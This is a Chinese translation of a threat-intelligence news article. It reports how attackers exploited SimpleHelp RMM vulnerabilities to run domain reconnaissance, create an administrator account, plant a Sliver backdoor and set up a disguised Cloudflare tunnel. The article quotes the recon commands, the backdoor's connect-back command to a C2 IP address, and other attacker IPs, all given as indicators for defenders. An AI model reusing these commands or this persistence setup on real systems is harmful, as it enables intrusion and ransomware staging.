---
title: 威胁行为者利用简单帮助漏洞部署Sliver后门
url: https://www.anquanke.com/post/id/304035
source: 安全客-有思想的安全新媒体
date: 2025-02-11
fetch_date: 2025-10-06T20:34:50.041450
---

# 威胁行为者利用简单帮助漏洞部署Sliver后门

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 威胁行为者利用简单帮助漏洞部署Sliver后门

阅读量**253048**

发布时间 : 2025-02-10 14:53:52

**x**

##### 译文声明

本文是翻译文章，文章原作者 do son，文章来源：securityonline

原文地址：<https://securityonline.info/threat-actors-exploit-simplehelp-vulnerabilities-to-deploy-sliver-backdoor/>

译文仅供参考，具体内容表达以及含义原文为准。

![hacked]()

网络安全公司 Field Effect 识别并挫败了一场复杂的网络攻击，此次攻击利用了在 SimpleHelp 的远程监控与管理（RMM）软件中新发现的漏洞。威胁行为者利用这些漏洞渗透目标网络，建立持久访问权限，并部署 Sliver 后门程序。Sliver 是一种后渗透框架，常用于红队演练，但如今越来越多地被网络犯罪分子滥用。

据 Field Effect 称，“此次攻击涉及快速且蓄意地执行一系列入侵后策略、技术和流程（TTPs），包括网络与系统探测、创建管理员账户以及建立持久化机制。若不是 Field Effect 的托管检测与响应（MDR）服务阻止了这次攻击，攻击者很可能会部署勒索软件。”

攻击始于一名威胁行为者通过被攻陷的名为 JWrapper – 远程访问的 SimpleHelp RMM 客户端获得访问权限。恶意连接源自位于爱沙尼亚的 IP 地址 194.76.227 [.] 171，通过 Shodan 扫描发现，该地址在 80 端口托管着一个 SimpleHelp 服务器。然而，由于各安全供应商的检测率较低，这种连接很可能避开了标准的网络安全过滤器。

获得访问权限后，攻击者执行了一系列侦察命令，以枚举系统信息、用户账户和网络结构。观察到的命令如下：

1.ipconfig /all（网络配置详细信息）

2.net group “domain admins” /domain（列出域管理员）

3.nltest /dclist:（枚举域控制器）

4.tasklist（列出正在运行的进程）

5.net share 和 net use（枚举共享网络资源）

![Sliver Backdoor]()

运行在 213.183.45 [.] 230 上的 SimpleHelp 实例截图 | 来源：Field Effect

幸运的是，Field Effect 的 MDR 解决方案迅速检测到异常，发出了高严重性警报，并在进一步升级之前隔离了受感染的端点。

侦察之后，攻击者通过创建一个名为 “sqladmin” 的新管理员账户来提升权限。然后，他们安装了一个恶意的 agent.exe 二进制文件作为持久化机制，以防失去 RMM 访问权限。

Field Effect 对 agent.exe 的分析表明，它与 Sliver 后渗透框架一致，Sliver 是一种基于 Go 语言的先进的命令与控制（C2）工具，可与 Cobalt Strike 和 Metasploit 相媲美。该二进制文件展现出进程注入、服务篡改和文件系统操作能力，这些都是基于 Sliver 入侵的典型特征。

Field Effect 报告称：“后门程序被配置为通过以下命令连接到 45.9.148 [.] 136 的 IP 地址和 443 端口：agent.exe -connect 45.9.148 [.] 136:443 -ignore-cert。”

这个位于荷兰的 C2 基础设施被发现正在运行 OpenSSH、AnyDesk 和其他远程访问服务，使其成为进一步恶意活动的强大发射平台。

进入环境后，攻击者将目标对准域控制器（DC），并重新建立 RMM 访问权限以执行相同的侦察命令集。然而，他们没有部署 agent.exe，而是选择了一个伪装成 Windows svchost.exe 的 Cloudflare 隧道，有效地绕过了防火墙限制，并对安全工具隐藏了流量。

据 Field Effect 称，“Field Effect MDR 端点代理阻止了隧道的尝试执行，随后该系统也从网络中被隔离。” 如果该活动未被检测到，这个隧道可能会为进一步的恶意软件部署提供便利，有可能导致勒索软件攻击。

虽然尚未明确归因，但 Field Effect 指出，之前在与 Akira 勒索软件组织相关的活动中也观察到了类似策略。然而，鉴于这些常见的 TTPs，多个威胁行为者可能正在利用 SimpleHelp 漏洞来实现自己的目的。

Field Effect 还证实，1 月 28 日早些时候的一次攻击，最初怀疑与 SimpleHelp 有关，实际上确实是由相同的 RMM 利用漏洞向量引起的。对 SimpleHelp 服务器配置的分析显示，它已被修改为接受来自位于俄罗斯 IP（213.183.45 [.] 230）上的恶意 SimpleHelp 实例的连接。

本文翻译自securityonline [原文链接](https://securityonline.info/threat-actors-exploit-simplehelp-vulnerabilities-to-deploy-sliver-backdoor/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/304035](/post/id/304035)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/threat-actors-exploit-simplehelp-vulnerabilities-to-deploy-sliver-backdoor/)

如若转载,请注明出处： <https://securityonline.info/threat-actors-exploit-simplehelp-vulnerabilities-to-deploy-sliver-backdoor/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**4赞

收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p0.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [CISA称黑客利用GeoServer漏洞成功入侵一联邦机构](/post/id/312347)

  2025-09-24 16:45:06
* ##### [SolarWinds紧急发布补丁，修复高危远程代码执行漏洞CVE-2025-26399](/post/id/312357)

  2025-09-24 16:43:11
* ##### [Chrome浏览器存在高危漏洞，可致攻击者窃取敏感信息并引发系统崩溃](/post/id/312366)

  2025-09-24 16:42:08
* ##### [CVE-2025-55241：CVSS评分10.0的Microsoft Entra ID漏洞可能危及全球所有租户](/post/id/312294)

  2025-09-22 18:14:51

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)